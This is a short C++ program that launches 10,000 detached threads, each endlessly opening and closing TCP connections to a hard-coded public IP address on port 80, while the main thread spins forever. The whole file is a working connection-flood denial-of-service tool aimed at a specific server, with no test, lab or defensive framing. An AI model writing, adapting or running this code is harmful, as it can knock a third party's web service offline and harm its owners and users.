#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <fcntl.h> // for non-blocking mode

const int num_threads = 10000;

void connectAndClose() {
    const char* server_ip = "34.132.134.162";
    const int server_port = 80;

    while (true) {
        int clientSocket = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
        if (clientSocket == -1) {
            std::cerr << "Error creating socket." << std::endl;
            return;
        }

        struct sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(server_port);
        serverAddr.sin_addr.s_addr = inet_addr(server_ip);

        connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
        
        close(clientSocket);
    }
}

int main() {
    for (int i = 0; i < num_threads; ++i) {
        std::thread connectionThread(connectAndClose);
        connectionThread.detach();
    }

    // Keep the main thread running indefinitely
    while (true) {}

    return 0;
}
